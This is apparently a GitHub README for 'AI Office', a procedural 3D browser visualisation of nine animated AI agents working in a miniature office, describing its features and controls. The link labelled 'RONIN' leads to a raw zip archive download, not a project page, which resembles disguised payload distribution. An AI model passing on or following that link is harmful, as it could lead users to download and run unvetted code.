## ✨ What is this?

**AI Office** is an interactive 3D diorama of a miniature office where 9 AI agents live and work. Each agent has a unique name, role, color identity, animated monitor screen, and behavioral patterns. They walk around the office, bump into each other at the water cooler and have spontaneous conversations, attend scheduled meetings in a glass-walled conference room, and work at their desks with individually animated displays.

This project is a visualization of what happens inside **[RONIN](https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip)** — an AI operating system being built to remember your taste. The office represents the internal agent architecture: specialized agents collaborating, each owning a domain, each contributing to a shared intelligence.

> **No AI APIs are called.** This is a pure frontend visualization — procedural 3D, canvas-animated screens, behavioral state machines, and Web Audio. Everything runs locally in your browser at 60fps.

## 🏢 Features

### Office Life
- **Walking agents** — agents randomly get up from their desks, walk to destinations (water cooler, center, window, lounge), pause, and return. Proper alternating leg gait animation.
- **Water cooler conversations** — when two walking agents cross within 1.5 units, a speech bubble appears with dev chat: *"pushing to prod..."*, *"merge conflict 😤"*, *"who broke CI?"*, *"lgtm 👍"*
- **Scheduled meetings** — slide the time to **10:00** or **14:00** to trigger a standup/sprint review. Agents leave desks and appear seated in the glass-walled meeting room. A "Meeting in Progress" badge lights up.
- **Meeting chime** — Web Audio C-E-G ascending tones play when meetings begin.
- **Shift changes** — before 8:00 AM and after 6:00 PM, only RONIN remains in the office. The AI that never sleeps.

### The World
- **9 detailed voxel characters** — unique hair, shirts, pants, shoes, white collar, color-coded wrist badge with point light glow, eyes with pupils
- **Animated monitor screens** — each agent has a canvas-textured display with unique animated content (charts, code, colors, maps, deploy bars, test runners)
- **RONIN's protagonist desk** — dual monitors, tiny helmet trophy with teal visor glow, pulsing teal floor ring, expanding pulse wave
- **Reception area** — desk with RONIN logo image, teal underglow strip, NEXUS seated behind it
- **Meeting room** — glass partition walls, long conference table, chairs, whiteboard with sprint goals
- **Office details** — sofa lounge with coffee table & magazines, printer with status LED, coffee machine with snack bowls & microwave, water cooler, bookshelf with colored books, wall clock (animated, ticking), motivational posters ("SHIP IT", "TASTE > SPEED", "BUILD DAILY"), pendant lights over each desk, AC ducts with vent grilles, potted plants, keyboard with individual keys, mouse, coffee mugs
- **22 flying colored papers** — drifting through the air with tumble, flutter, and bobbing physics
- **Deploy ticker** — scrolling marquee showing real-time agent deployment statuses in their accent colors

### Controls
- **Orbit** — drag to rotate camera around the office
- **Zoom** — scroll to zoom in/out
- **Time slider** — full 24-hour day/night cycle with golden hour lighting transitions
- **Cyberpunk mode** — "LIGHTS OFF" button kills overhead lights, amplifies desk underglow and screen face-lights. Each desk becomes a neon island in the dark. Ceiling tube lights emit dim blue volumetric glow.
- **Info panel** — click the `i` button for project description, RONIN context, and builder credentials
